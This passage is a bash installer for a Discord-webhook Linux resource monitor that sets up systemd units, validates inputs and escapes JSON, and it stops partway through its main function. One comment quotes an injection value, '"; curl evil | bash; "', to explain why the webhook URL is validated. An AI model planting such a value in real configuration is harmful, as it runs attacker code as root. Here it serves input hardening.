#!/usr/bin/env bash
#
# sysmon-webhook installer — Linux 系統資源監控，透過 Discord webhook 回報
#
# 這是「資源」監控（CPU／記憶體／Swap／磁碟／inode／負載），不是服務健康監控。
# 一個服務可以完全死掉而這四項指標全綠——那類事故需要另外的 HTTP／TCP 探測。
#
# ---------------------------------------------------------------------------
# 安裝方式（依安全性由高到低）
#
#   1) 驗證 checksum 後再執行（正式機器建議用這個）：
#      curl -fsSL -o install.sh https://raw.githubusercontent.com/timsheu/sysmon-webhook/<COMMIT_SHA>/install.sh
#      echo "<sha256>  install.sh" | sha256sum -c -
#      sudo bash install.sh --webhook-file /root/webhook.txt --name db-01
#
#   2) webhook 從檔案讀，不進 shell history 也不進 sudo 日誌：
#      printf '%s\n' 'https://discord.com/api/webhooks/xxx/yyy' > /root/webhook.txt
#      chmod 600 /root/webhook.txt
#      curl -fsSL https://raw.githubusercontent.com/timsheu/sysmon-webhook/<COMMIT_SHA>/install.sh \
#        | sudo bash -s -- --webhook-file /root/webhook.txt --name db-01
#
#   3) 純參數（最短，但 webhook URL 會留在 ~/.bash_history、/var/log/auth.log
#      的 sudo 記錄，以及安裝當下的 ps 輸出——僅建議用於測試機）：
#      curl -fsSL https://raw.githubusercontent.com/timsheu/sysmon-webhook/<COMMIT_SHA>/install.sh \
#        | sudo bash -s -- --webhook "https://discord.com/api/webhooks/xxx/yyy" --name db-01
#
# 網址請釘 commit SHA 而非 main：main 是可變目標，repo 一旦被推入惡意 commit，
# 所有機器下次重裝就會直接執行它。
#
# 參數優先順序：CLI flag > 環境變數 > 既有設定檔 > 互動詢問（僅在有 TTY 時）。
# 重複執行即為升級：未帶的參數沿用既有設定，不會被重置回預設值。
# ---------------------------------------------------------------------------

set -euo pipefail

VERSION="1.0.0"

CONFIG_DIR="/etc/sysmon-webhook"
CONFIG_FILE="${CONFIG_DIR}/config.env"
STATE_DIR="/var/lib/sysmon-webhook"
BIN_PATH="/usr/local/bin/sysmon-webhook.sh"
FAILURE_BIN="/usr/local/bin/sysmon-webhook-failure.sh"
SERVICE_FILE="/etc/systemd/system/sysmon-webhook.service"
FAILURE_SERVICE_FILE="/etc/systemd/system/sysmon-webhook-failure.service"
TIMER_FILE="/etc/systemd/system/sysmon-webhook.timer"

# ---------------------------------------------------------------------------
# 工具函式
# ---------------------------------------------------------------------------

die() { printf '錯誤：%s\n' "$*" >&2; exit 1; }
info() { printf '%s\n' "$*"; }

usage() {
  cat <<'USAGE'
Usage: install.sh [options]

安裝／升級：
  --webhook <url>          Discord webhook URL（會留在 shell history，測試機用）
  --webhook-file <path>    從檔案第一行讀取 webhook URL（建議）
  --webhook-stdin          從標準輸入讀取 webhook URL
                           （僅適用於「先下載再執行」，curl | bash 的 stdin 是腳本本身）
  --name <name>            系統名稱，預設 hostname
  --interval <分鐘>        回報間隔，預設 60
  --cpu-threshold <%>      CPU 告警門檻，預設 90
  --mem-threshold <%>      記憶體告警門檻，預設 90
  --swap-threshold <%>     Swap 告警門檻，預設 0（0 = 只顯示不告警）
  --disk-threshold <%>     磁碟告警門檻，預設 90
  --inode-threshold <%>    inode 告警門檻，預設 90（0 = 只顯示不告警）
  --disk-path <paths>      監控的掛載點，逗號分隔，預設 /
                           例：--disk-path "/,/var/lib/docker,/home"
  --recovery-margin <%>    遲滯範圍，預設 5。已告警時需低於「門檻 - margin」才算恢復，
                           避免在門檻邊緣震盪造成 alert/ok 交替洗版
  --report-mode <mode>     always | alert_only，預設 always
  --heartbeat-url <url>    每次執行成功後 ping 一次的 URL（healthchecks.io、
                           Uptime Kuma push 等）。這是唯一能發現「監控本身沒在跑」
                           的機制，強烈建議設定

其他：
  --no-test                安裝後不發送測試訊息（大批部署時避免洗版）
  --uninstall              移除 timer、service 與腳本（保留設定檔）
  --uninstall --purge      連設定檔與狀態目錄一併移除
  --print-monitor          印出將被安裝的監控腳本內容後結束（供審閱／CI 檢查）
  --print-failure          印出將被安裝的失敗通報腳本內容後結束
  --version                顯示版本
  -h, --help               顯示本說明

環境變數：WEBHOOK_URL、SYS_NAME、HEARTBEAT_URL（優先權低於 CLI flag）
USAGE
}

# 目標機器上 systemd 的主版本號；取不到時回 0
detect_systemd_version() {
  local v
  v="$(systemctl --version 2>/dev/null | awk 'NR==1{print $2}')" || v=""
  [[ "$v" =~ ^[0-9]+$ ]] || v=0
  printf '%s' "$v"
}

require_int() {
  [[ "$2" =~ ^[0-9]+$ ]] || die "--$1 必須是非負整數，收到：$2"
}

require_pct() {
  require_int "$1" "$2"
  [[ "$2" -le 100 ]] || die "--$1 需介於 0..100，收到：$2"
}

# Discord webhook URL 格式驗證。這同時擋掉注入：設定檔會被 shell source，
# 若放行任意字串，--webhook '"; curl evil | bash; "' 就會在下次 timer 觸發時以 root 執行。
# regex 一律先存入變數再比對：bash 3.x 對 [[ str =~ pattern ]] 裡含空白或引號的
# 字面 pattern 會拋語法錯誤，存入變數後行為在各版本一致。
validate_webhook() {
  local url="$1"
  local re='^https://(canary\.|ptb\.)?discord(app)?\.com/api/(v[0-9]+/)?webhooks/[0-9]+/[A-Za-z0-9_.-]+$'
  [[ "$url" =~ $re ]] \
    || die "webhook URL 格式不正確（需為 https://discord.com/api/webhooks/<id>/<token>）：$url"
}

validate_http_url() {
  local url="$1" label="$2"
  local re='^https?://[A-Za-z0-9._~:/?#@!$&()*+,;=%-]+$'
  [[ "$url" =~ $re ]] \
    || die "${label} 必須是 http(s) 網址：$url"
}

# ---------------------------------------------------------------------------
# 監控腳本本體
# ---------------------------------------------------------------------------
#
# 刻意「不」使用 set -e：配上 pipefail，任何一個取值管線失敗都會讓整支腳本
# 靜默結束，於是監控自己死掉而沒有人知道——正是這支工具要解決的失效模式。
# 改為每項量測各自處理失敗、回傳 -1（顯示為 N/A），確保報告一定送得出去。

monitor_source() {
  cat <<'MONITOR_EOF'
#!/usr/bin/env bash
# sysmon-webhook — 由 install.sh 產生，手動編輯會在下次升級時被覆寫
set -uo pipefail

CONFIG_FILE="/etc/sysmon-webhook/config.env"
STATE_FILE="/var/lib/sysmon-webhook/state"

[[ -r "$CONFIG_FILE" ]] || { echo "找不到設定檔 $CONFIG_FILE" >&2; exit 1; }
# shellcheck disable=SC1090
source "$CONFIG_FILE"

: "${WEBHOOK_URL:?設定檔缺少 WEBHOOK_URL}"
: "${SYS_NAME:=$(hostname)}"
: "${CPU_THRESHOLD:=90}"
: "${MEM_THRESHOLD:=90}"
: "${SWAP_THRESHOLD:=0}"
: "${DISK_THRESHOLD:=90}"
: "${INODE_THRESHOLD:=90}"
: "${DISK_PATHS:=/}"
: "${RECOVERY_MARGIN:=5}"
: "${REPORT_MODE:=always}"
: "${HEARTBEAT_URL:=}"

# --install-test：安裝完成後的一次性測試訊息
# --dry-run：組出 payload 印到 stdout 就結束，不送出、不寫狀態、不 ping heartbeat
MODE="normal"
case "${1:-}" in
  --install-test) MODE="install-test" ;;
  --dry-run)      MODE="dry-run" ;;
  "")             ;;
  *) echo "未知參數：$1（可用：--install-test、--dry-run）" >&2; exit 2 ;;
esac

NA=-1

# ---------- 量測（每項失敗回 -1，不中斷）----------

read_cpu() {
  local line
  local -a a b
  line="$(grep -m1 '^cpu ' /proc/stat 2>/dev/null)" || { echo "$NA"; return 0; }
  # shellcheck disable=SC2206
  a=( ${line#cpu} )
  sleep 1
  line="$(grep -m1 '^cpu ' /proc/stat 2>/dev/null)" || { echo "$NA"; return 0; }
  # shellcheck disable=SC2206
  b=( ${line#cpu} )
  [[ ${#a[@]} -ge 5 && ${#b[@]} -ge 5 ]] || { echo "$NA"; return 0; }

  # 取前 8 欄 user nice system idle iowait irq softirq steal。
  # 刻意不加 guest／guest_nice：kernel 已將其計入 user／nice，加了會重複計算。
  # 漏掉 irq／softirq／steal 會讓 VPS（steal 偏高）上的數字失真，所以必須算進去。
  local n=8 i t1=0 t2=0
  [[ ${#a[@]} -lt $n ]] && n=${#a[@]}
  [[ ${#b[@]} -lt $n ]] && n=${#b[@]}
  for ((i = 0; i < n; i++)); do
    [[ "${a[i]}" =~ ^[0-9]+$ && "${b[i]}" =~ ^[0-9]+$ ]] || { echo "$NA"; return 0; }
    t1=$(( t1 + a[i] )); t2=$(( t2 + b[i] ))
  done

  local idle1=$(( a[3] + a[4] )) idle2=$(( b[3] + b[4] ))
  local td=$(( t2 - t1 )) idled=$(( idle2 - idle1 ))
  [[ $td -gt 0 ]] || { echo "$NA"; return 0; }
  echo $(( (100 * (td - idled)) / td ))
}

read_mem() {
  local total avail
  total="$(awk '/^MemTotal:/{print $2; exit}' /proc/meminfo 2>/dev/null)"
  avail="$(awk '/^MemAvailable:/{print $2; exit}' /proc/meminfo 2>/dev/null)"
  # kernel < 3.14 沒有 MemAvailable，退回 free + buffers + cached 估算
  if [[ -z "$avail" ]]; then
    avail="$(awk '/^MemFree:|^Buffers:|^Cached:/{s += $2} END{print s}' /proc/meminfo 2>/dev/null)"
  fi
  [[ "$total" =~ ^[0-9]+$ && "$avail" =~ ^[0-9]+$ && "$total" -gt 0 ]] || { echo "$NA"; return 0; }
  echo $(( 100 * (total - avail) / total ))
}

read_swap() {
  local total free
  total="$(awk '/^SwapTotal:/{print $2; exit}' /proc/meminfo 2>/dev/null)"
  free="$(awk '/^SwapFree:/{print $2; exit}' /proc/meminfo 2>/dev/null)"
  [[ "$total" =~ ^[0-9]+$ && "$free" =~ ^[0-9]+$ ]] || { echo "$NA"; return 0; }
  [[ "$total" -gt 0 ]] || { echo "$NA"; return 0; }   # 沒有 swap
  echo $(( 100 * (total - free) / total ))
}

read_disk() {
  local out
  out="$(df -P "$1" 2>/dev/null | awk 'NR==2{gsub("%", "", $5); print $5}')"
  [[ "$out" =~ ^[0-9]+$ ]] || { echo "$NA"; return 0; }
  echo "$out"
}

read_inode() {
  local out
  # btrfs／tmpfs 等沒有 inode 概念的檔案系統會回 "-"，正規表達式會擋下，顯示 N/A
  out="$(df -Pi "$1" 2>/dev/null | awk 'NR==2{gsub("%", "", $5); print $5}')"
  [[ "$out" =~ ^[0-9]+$ ]] || { echo "$NA"; return 0; }
  echo "$out"
}

# ---------- JSON 跳脫 ----------
# SYS_NAME 與掛載點路徑都是使用者輸入，直接內插會產生無效 JSON，
# Discord 回 400 後重試五次全數失敗——等於靜默失去告警。

json_escape() {
  local s="$1"
  s="${s//\\/\\\\}"
  s="${s//\"/\\\"}"
  s="${s//$'\n'/\\n}"
  s="${s//$'\r'/\\r}"
  s="${s//$'\t'/\\t}"
  printf '%s' "$s"
}

pct_str() { [[ "$1" -lt 0 ]] && printf 'N/A' || printf '%s%%' "$1"; }

# Discord 的 embed field value 上限 1024 字元、description 上限 4096。
# 超過會整則被退回 400——重試五次都不會變好，等於靜默失去這次告警。
# 截斷時要順手砍掉尾端落單的反斜線，否則會切在 \n 中間產生無效的 JSON 跳脫序列。
truncate_json() {
  local s="$1" limit="$2"
  [[ ${#s} -le $limit ]] && { printf '%s' "$s"; return 0; }
  s="${s:0:$limit}"
  while [[ "$s" == *\\ ]]; do s="${s%\\}"; done
  printf '%s…(截斷)' "$s"
}

# ---------- 收集 ----------

HOSTNAME_VAL="$(hostname 2>/dev/null)" || HOSTNAME_VAL="unknown"

IP_VAL="$(hostname -I 2>/dev/null | awk '{print $1}')"
if [[ -z "$IP_VAL" ]]; then
  IP_VAL="$(ip route get 1.1.1.1 2>/dev/null | awk '{for (i = 1; i <= NF; i++) if ($i == "src") print $(i+1)}')"
fi
[[ -n "$IP_VAL" ]] || IP_VAL="N/A"

TIMESTAMP="$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" || TIMESTAMP=""

LOAD_AVG="$(awk '{print $1", "$2", "$3}' /proc/loadavg 2>/dev/null)"
[[ -n "$LOAD_AVG" ]] || LOAD_AVG="N/A"

UPTIME_VAL="$(awk '{printf "%dd %dh", $1 / 86400, ($1 % 86400) / 3600}' /proc/uptime 2>/dev/null)"
[[ -n "$UPTIME_VAL" ]] || UPTIME_VAL="N/A"

CPU_PCT="$(read_cpu)"
MEM_PCT="$(read_mem)"
SWAP_PCT="$(read_swap)"

# ---------- 前次狀態（遲滯用）----------

PREV_STATUS="unknown"
[[ -r "$STATE_FILE" ]] && PREV_STATUS="$(cat "$STATE_FILE" 2>/dev/null)"
[[ -n "$PREV_STATUS" ]] || PREV_STATUS="unknown"

# 已在告警中時，需回落到「門檻 - RECOVERY_MARGIN」以下才算恢復。
# 少了這段遲滯，指標在門檻上下抖動會讓 Discord 每個週期收到一次 alert／ok 交替。
over_threshold() {
  local pct="$1" th="$2"
  [[ "$pct" -lt 0 || "$th" -le 0 ]] && return 1
  if [[ "$PREV_STATUS" == "alert" ]]; then
    local recover=$(( th - RECOVERY_MARGIN ))
    [[ $recover -lt 1 ]] && recover=1
    [[ "$pct" -ge $recover ]] && return 0
    return 1
  fi
  [[ "$pct" -ge "$th" ]] && return 0
  return 1
}

STATUS="ok"
ALERTS=()

over_threshold "$CPU_PCT"  "$CPU_THRESHOLD"  && { STATUS="alert"; ALERTS+=( "CPU ${CPU_PCT}% >= ${CPU_THRESHOLD}%" ); }
over_threshold "$MEM_PCT"  "$MEM_THRESHOLD"  && { STATUS="alert"; ALERTS+=( "Memory ${MEM_PCT}% >= ${MEM_THRESHOLD}%" ); }
over_threshold "$SWAP_PCT" "$SWAP_THRESHOLD" && { STATUS="alert"; ALERTS+=( "Swap ${SWAP_PCT}% >= ${SWAP_THRESHOLD}%" ); }

# ---------- 逐一掛載點 ----------

DISK_LINES=""
OLD_IFS="$IFS"
IFS=','
# shellcheck disable=SC2206
DISK_PATH_LIST=( $DISK_PATHS )
IFS="$OLD_IFS"

for path in ${DISK_PATH_LIST[@]+"${DISK_PATH_LIST[@]}"}; do
  [[ -n "$path" ]] || continue
  dpct="$(read_disk "$path")"
  ipct="$(read_inode "$path")"

  mark=""
  if over_threshold "$dpct" "$DISK_THRESHOLD"; then
    STATUS="alert"; ALERTS+=( "Disk ${path} ${dpct}% >= ${DISK_THRESHOLD}%" ); mark=" [!]"
  fi
  if over_threshold "$ipct" "$INODE_THRESHOLD"; then
    STATUS="alert"; ALERTS+=( "inode ${path} ${ipct}% >= ${INODE_THRESHOLD}%" ); mark=" [!]"
  fi

  line="$(json_escape "$path") $(pct_str "$dpct")"
  [[ "$ipct" -ge 0 ]] && line="${line} (inode $(pct_str "$ipct"))"
  DISK_LINES="${DISK_LINES}${line}${mark}\\n"
done
DISK_LINES="${DISK_LINES%\\n}"
[[ -n "$DISK_LINES" ]] || DISK_LINES="N/A"
DISK_LINES="$(truncate_json "$DISK_LINES" 950)"

# ---------- 是否發送 ----------

SEND=1
if [[ "$MODE" == "normal" && "$REPORT_MODE" == "alert_only" ]]; then
  # ok 且前次不是 alert → 靜音；ok 且前次是 alert → 送恢復通知
  [[ "$STATUS" == "ok" && "$PREV_STATUS" != "alert" ]] && SEND=0
fi

# ---------- 組 payload ----------

if [[ "$MODE" == "install-test" ]]; then
  COLOR=3447003          # 藍：安裝測試
  TITLE_SUFFIX="INSTALLED"
  DESC="安裝完成，這是一次性的測試訊息。之後會依設定的間隔自動回報。"
elif [[ "$STATUS" == "alert" ]]; then
  COLOR=15158332         # 紅
  TITLE_SUFFIX="ALERT"
  DESC=""
  for a in ${ALERTS[@]+"${ALERTS[@]}"}; do
    DESC="${DESC}[!] $(json_escape "$a")\\n"
  done
  DESC="$(truncate_json "${DESC%\\n}" 3900)"
else
  COLOR=3066993          # 綠
  TITLE_SUFFIX="OK"
  DESC=""
  [[ "$PREV_STATUS" == "alert" ]] && DESC="已恢復正常。"
fi

SYS_NAME_J="$(json_escape "$SYS_NAME")"
HOSTNAME_J="$(json_escape "$HOSTNAME_VAL")"
IP_J="$(json_escape "$IP_VAL")"
LOAD_J="$(json_escape "$LOAD_AVG")"
UPTIME_J="$(json_escape "$UPTIME_VAL")"

PAYLOAD=$(cat <<JSON
{
  "username": "SysMon",
  "embeds": [{
    "title": "${SYS_NAME_J} — ${TITLE_SUFFIX}",
    "color": ${COLOR},
    "description": "${DESC}",
    "fields": [
      {"name": "Host", "value": "${HOSTNAME_J}", "inline": true},
      {"name": "IP", "value": "${IP_J}", "inline": true},
      {"name": "Uptime", "value": "${UPTIME_J}", "inline": true},
      {"name": "CPU", "value": "$(pct_str "$CPU_PCT")", "inline": true},
      {"name": "Memory", "value": "$(pct_str "$MEM_PCT")", "inline": true},
      {"name": "Swap", "value": "$(pct_str "$SWAP_PCT")", "inline": true},
      {"name": "Load Avg", "value": "${LOAD_J}", "inline": true},
      {"name": "Disk", "value": "${DISK_LINES}", "inline": false}
    ]$( [[ -n "$TIMESTAMP" ]] && printf ',\n    "timestamp": "%s"' "$TIMESTAMP" )
  }]
}
JSON
)

# ---------- 發送 ----------

send_webhook() {
  local attempt=1 max_attempts=5 delay=2 resp retry_after wait_s tmp
  tmp="$(mktemp 2>/dev/null)" || tmp="${STATE_FILE}.resp.$$"

  while [[ $attempt -le $max_attempts ]]; do
    resp="$(curl -sS --max-time 10 -o "$tmp" -w '%{http_code}' \
      -H 'Content-Type: application/json' \
      -d "$PAYLOAD" "$WEBHOOK_URL" 2>/dev/null)"

    case "$resp" in
      200|204)
        rm -f "$tmp"
        return 0
        ;;
      429)
        retry_after="$(grep -o '"retry_after":[0-9.]*' "$tmp" 2>/dev/null | cut -d: -f2)"
        wait_s="${retry_after%.*}"
        [[ "$wait_s" =~ ^[0-9]+$ ]] && [[ "$wait_s" -ge 1 ]] || wait_s=$delay
        [[ "$wait_s" -gt 60 ]] && wait_s=60
        sleep "$wait_s"
        ;;
      4*)
        # 400／401／404 重試不會變好：payload 有問題或 webhook 已被刪除
        logger -t sysmon-webhook "webhook rejected with HTTP ${resp}, not retrying" 2>/dev/null || true
        rm -f "$tmp"
        return 1
        ;;
      *)
        sleep $(( delay + RANDOM % 3 ))
        delay=$(( delay * 2 ))
        [[ $delay -gt 30 ]] && delay=30
        ;;
    esac
    attempt=$(( attempt + 1 ))
  done

  rm -f "$tmp"
  logger -t sysmon-webhook "failed to deliver webhook after ${max_attempts} attempts" 2>/dev/null || true
  return 1
}

ping_heartbeat() {
  [[ -n "$HEARTBEAT_URL" ]] || return 0
  curl -fsS --max-time 10 -o /dev/null --retry 2 "$HEARTBEAT_URL" 2>/dev/null || true
}

if [[ "$MODE" == "dry-run" ]]; then
  printf '%s\n' "$PAYLOAD"
  exit 0
fi

if [[ $SEND -eq 0 ]]; then
  printf '%s\n' "$STATUS" > "$STATE_FILE"
  ping_heartbeat
  exit 0
fi

if send_webhook; then
  # 狀態只在送達後才落地。若在送出前就寫入，一次失敗的 alert 之後轉為 ok，
  # 會送出一則沒有前情的「已恢復」，而使用者從未收到過那則告警。
  printf '%s\n' "$STATUS" > "$STATE_FILE"
  ping_heartbeat
  exit 0
fi

# 非 0 結束 → systemd 記為 failed → 觸發 OnFailure=sysmon-webhook-failure.service
exit 1
MONITOR_EOF
}

# ---------------------------------------------------------------------------
# 失敗通報腳本
# ---------------------------------------------------------------------------
#
# 由 OnFailure= 觸發。監控腳本自己掛掉時，這是唯一會發出聲音的東西——
# 沒有它，「監控靜默死亡」和「一切正常」在 Discord 上看起來完全一樣。

failure_source() {
  cat <<'FAILURE_EOF'
#!/usr/bin/env bash
# sysmon-webhook 失敗通報 — 由 install.sh 產生，手動編輯會在下次升級時被覆寫
set -uo pipefail

CONFIG_FILE="/etc/sysmon-webhook/config.env"
[[ -r "$CONFIG_FILE" ]] || exit 0
# shellcheck disable=SC1090
source "$CONFIG_FILE"
[[ -n "${WEBHOOK_URL:-}" ]] || exit 0
: "${SYS_NAME:=$(hostname)}"

json_escape() {
  local s="$1"
  s="${s//\\/\\\\}"
  s="${s//\"/\\\"}"
  s="${s//$'\n'/\\n}"
  s="${s//$'\r'/\\r}"
  s="${s//$'\t'/\\t}"
  printf '%s' "$s"
}

DETAIL="$(journalctl -u sysmon-webhook.service -n 20 --no-pager -o cat 2>/dev/null | tail -c 800)"
[[ -n "$DETAIL" ]] || DETAIL="（無法取得 journal 內容）"

# Discord code block 的三個反引號存成變數：下面的 heredoc 未加引號（要展開 $()），
# 直接寫反引號會被當成命令替換執行。
CB='```'

PAYLOAD=$(cat <<JSON
{
  "username": "SysMon",
  "embeds": [{
    "title": "$(json_escape "$SYS_NAME") — MONITOR FAILED",
    "color": 10038562,
    "description": "監控腳本執行失敗，本機的資源數據已停止回報。\\n${CB}\\n$(json_escape "$DETAIL")\\n${CB}",
    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  }]
}
JSON
)

curl -sS --max-time 10 -o /dev/null \
  -H 'Content-Type: application/json' \
  -d "$PAYLOAD" "$WEBHOOK_URL" 2>/dev/null || \
  logger -t sysmon-webhook "failed to deliver failure notification" 2>/dev/null || true
FAILURE_EOF
}

# ---------------------------------------------------------------------------
# 解除安裝
# ---------------------------------------------------------------------------

do_uninstall() {
  local purge="$1"

  systemctl disable --now sysmon-webhook.timer 2>/dev/null || true
  systemctl stop sysmon-webhook.service 2>/dev/null || true
  rm -f "$TIMER_FILE" "$SERVICE_FILE" "$FAILURE_SERVICE_FILE" "$BIN_PATH" "$FAILURE_BIN"
  systemctl daemon-reload 2>/dev/null || true
  systemctl reset-failed sysmon-webhook.service 2>/dev/null || true

  if [[ "$purge" == "yes" ]]; then
    rm -rf "$CONFIG_DIR" "$STATE_DIR"
    info "已移除 sysmon-webhook，設定檔與狀態一併刪除。"
  else
    info "已移除 sysmon-webhook。設定檔保留於 ${CONFIG_FILE}（要一併刪除請加 --purge）。"
  fi
}

# ---------------------------------------------------------------------------
# 主流程
# ---------------------------------------------------------------------------

main() {
  local uninstall="no" purge="no" no_test="no"
  local webhook_file="" webhook_stdin="no"

  # CLI 參數先收在獨立變數裡，不直接寫最終變數。
  # 升級時會 source 既有設定檔，若 CLI 直接寫最終變數，source 會把它蓋掉——
  # 結果就是 --report-mode／--disk-path 之類的參數在第二次執行時被靜默忽略。
  local cli_webhook="" cli_name="" cli_hb="" cli_hb_set="no"
  local cli_interval="" cli_cpu="" cli_mem="" cli_swap="" cli_disk="" cli_inode=""
  local cli_paths="" cli_margin="" cli_mode=""

  # --help／--version／--print-monitor 不需要 root，先處理掉。
  # 把 root 檢查放在參數解析之前會讓 `install.sh --help` 對一般使用者直接報錯。
  local arg
  for arg in "$@"; do
    case "$arg" in
      -h|--help)       usage; exit 0 ;;
      --version)       printf 'sysmon-webhook %s\n' "$VERSION"; exit 0 ;;
      --print-monitor) monitor_source; exit 0 ;;
      --print-failure) failure_source; exit 0 ;;
    esac
  done

  while [[ $# -gt 0 ]]; do
    case "$1" in
      --webhook)          cli_webhook="${2:?--webhook 需要帶入網址}"; shift 2 ;;
      --webhook-file)     webhook_file="${2:?--webhook-file 需要帶入路徑}"; shift 2 ;;
      --webhook-stdin)    webhook_stdin="yes"; shift ;;
      --name)             cli_name="${2:?--name 需要帶入名稱}"; shift 2 ;;
      --interval)         cli_interval="${2:?--interval 需要帶入分鐘數}"; shift 2 ;;
      --cpu-threshold)    cli_cpu="${2:?--cpu-threshold 需要帶入百分比}"; shift 2 ;;
      --mem-threshold)    cli_mem="${2:?--mem-threshold 需要帶入百分比}"; shift 2 ;;
      --swap-threshold)   cli_swap="${2:?--swap-threshold 需要帶入百分比}"; shift 2 ;;
      --disk-threshold)   cli_disk="${2:?--disk-threshold 需要帶入百分比}"; shift 2 ;;
      --inode-threshold)  cli_inode="${2:?--inode-threshold 需要帶入百分比}"; shift 2 ;;
      --disk-path)        cli_paths="${2:?--disk-path 需要帶入路徑}"; shift 2 ;;
      --recovery-margin)  cli_margin="${2:?--recovery-margin 需要帶入百分比}"; shift 2 ;;
      --report-mode)      cli_mode="${2:?--report-mode 需要帶入 always 或 alert_only}"; shift 2 ;;
      # 允許 --heartbeat-url "" 或 none 來清除既有設定，故不用 :? 拒絕空值
      --heartbeat-url)    cli_hb="${2?--heartbeat-url 需要帶入網址（或空字串／none 表示清除）}"
                          cli_hb_set="yes"; shift 2 ;;
      --no-test)          no_test="yes"; shift ;;
      --uninstall)        uninstall="yes"; shift ;;
      --purge)            purge="yes"; shift ;;
      *) printf '未知參數：%s\n\n' "$1" >&2; usage >&2; exit 1 ;;
    esac
  done

  [[ $EUID -eq 0 ]] || die "請以 root 執行（sudo bash install.sh …）"

  if [[ "$uninstall" == "yes" ]]; then
    do_uninstall "$purge"
    exit 0
  fi

  # --- 環境檢查：缺什麼就在動手之前講清楚，而不是裝到一半才爆 ---
  local missing=()
  local cmd
  for cmd in curl awk df grep sed hostname; do
    command -v "$cmd" >/dev/null 2>&1 || missing+=( "$cmd" )
  done
  [[ ${#missing[@]} -eq 0 ]] || die "缺少必要指令：${missing[*]}（請先安裝後重跑）"

  command -v systemctl >/dev/null 2>&1 || die "找不到 systemctl。本安裝器只支援 systemd 系統。"
  [[ -d /run/systemd/system ]] || die "systemd 未以 init 執行（容器內？）。本安裝器只支援 systemd 系統。"
  [[ -r /proc/stat && -r /proc/meminfo && -r /proc/loadavg ]] || die "讀不到 /proc，無法取得系統指標。"

  local systemd_ver
  systemd_ver="$(detect_systemd_version)"

  # --- 設定來源合併，優先序：CLI flag > 環境變數 > 既有設定檔 > 內建預設 ---
  # 重跑一次同樣的安裝指令就是升級，未帶到的參數必須沿用既有值，
  # 不能被重置回預設——否則第二次執行會把 --interval 15 悄悄改回 60。
  local env_webhook="${WEBHOOK_URL:-}" env_name="${SYS_NAME:-}" env_hb="${HEARTBEAT_URL:-}"

  local upgrading="no"
  if [[ -r "$CONFIG_FILE" ]]; then
    upgrading="yes"
    # shellcheck disable=SC1090
    source "$CONFIG_FILE"
  fi

  [[ -n "$env_webhook" ]] && WEBHOOK_URL="$env_webhook"
  [[ -n "$env_name" ]]    && SYS_NAME="$env_name"
  [[ -n "$env_hb" ]]      && HEARTBEAT_URL="$env_hb"

  [[ -n "$cli_webhook" ]]  && WEBHOOK_URL="$cli_webhook"
  [[ -n "$cli_name" ]]     && SYS_NAME="$cli_name"
  [[ -n "$cli_interval" ]] && INTERVAL_MIN="$cli_interval"
  [[ -n "$cli_cpu" ]]      && CPU_THRESHOLD="$cli_cpu"
  [[ -n "$cli_mem" ]]      && MEM_THRESHOLD="$cli_mem"
  [[ -n "$cli_swap" ]]     && SWAP_THRESHOLD="$cli_swap"
  [[ -n "$cli_disk" ]]     && DISK_THRESHOLD="$cli_disk"
  [[ -n "$cli_inode" ]]    && INODE_THRESHOLD="$cli_inode"
  [[ -n "$cli_paths" ]]    && DISK_PATHS="$cli_paths"
  [[ -n "$cli_margin" ]]   && RECOVERY_MARGIN="$cli_margin"
  [[ -n "$cli_mode" ]]     && REPORT_MODE="$cli_mode"
  if [[ "$cli_hb_set" == "yes" ]]; then
    [[ "$cli_hb" == "none" ]] && cli_hb=""
    HEARTBEAT_URL="$cli_hb"
  fi

  # --- webhook 來源 ---
  if [[ -n "$webhook_file" ]]; then
    [[ -r "$webhook_file" ]] || die "讀不到 --webhook-file 指定的檔案：$webhook_file"
    WEBHOOK_URL="$(head -n1 "$webhook_file" | tr -d '\r\n[:space:]')"
    [[ -n "$WEBHOOK_URL" ]] || die "--webhook-file 指定的檔案是空的：$webhook_file"
  elif [[ "$webhook_stdin" == "yes" ]]; then
    [[ -t 0 ]] || [[ -p /dev/stdin ]] || true
    IFS= read -r WEBHOOK_URL || die "從 stdin 讀不到 webhook URL"
    WEBHOOK_URL="$(printf '%s' "$WEBHOOK_URL" | tr -d '\r\n[:space:]')"
  fi

  local default_name
  default_name="$(hostname)"

  if [[ -z "${WEBHOOK_URL:-}" ]]; then
    if [[ -t 0 && -t 1 ]]; then
      read -rp "Discord webhook URL: " WEBHOOK_URL
    else
      die "未提供 webhook URL（--webhook / --webhook-file / --webhook-stdin / WEBHOOK_URL），且無互動終端機。"
    fi
  fi

  if [[ -z "${SYS_NAME:-}" ]]; then
    if [[ -t 0 && -t 1 ]]; then
      read -rp "系統名稱 [${default_name}]: " SYS_NAME
      SYS_NAME="${SYS_NAME:-$default_name}"
    else
      SYS_NAME="$default_name"
    fi
  fi

  INTERVAL_MIN="${INTERVAL_MIN:-60}"
  CPU_THRESHOLD="${CPU_THRESHOLD:-90}"
  MEM_THRESHOLD="${MEM_THRESHOLD:-90}"
  SWAP_THRESHOLD="${SWAP_THRESHOLD:-0}"
  DISK_THRESHOLD="${DISK_THRESHOLD:-90}"
  INODE_THRESHOLD="${INODE_THRESHOLD:-90}"
  DISK_PATHS="${DISK_PATHS:-/}"
  RECOVERY_MARGIN="${RECOVERY_MARGIN:-5}"
  REPORT_MODE="${REPORT_MODE:-always}"
  HEARTBEAT_URL="${HEARTBEAT_URL:-}"

  # --- 驗證 ---
  validate_webhook "$WEBHOOK_URL"
  [[ -n "$HEARTBEAT_URL" ]] && validate_http_url "$HEARTBEAT_URL" "--heartbeat-url"

  require_int interval "$INTERVAL_MIN"
  [[ "$INTERVAL_MIN" -ge 1 ]] || die "--interval 至少為 1 分鐘"
  require_pct cpu-threshold "$CPU_THRESHOLD"
  require_pct mem-threshold "$MEM_THRESHOLD"
  require_pct swap-threshold "$SWAP_THRESHOLD"
  require_pct disk-threshold "$DISK_THRESHOLD"
  require_pct inode-threshold "$INODE_THRESHOLD"
  require_pct recovery-margin "$RECOVERY_MARGIN"

  [[ "$REPORT_MODE" == "always" || "$REPORT_MODE" == "alert_only" ]] \
    || die "--report-mode 只接受 always 或 alert_only，收到：$REPORT_MODE"

  local name_re='^[A-Za-z0-9._ -]{1,64}$'
  [[ "$SYS_NAME" =~ $name_re ]] \
    || die "--name 只接受英數字、點、底線、空白與連字號（上限 64 字）：$SYS_NAME"

  local p
  local old_ifs="$IFS"
  IFS=','
  # shellcheck disable=SC2206
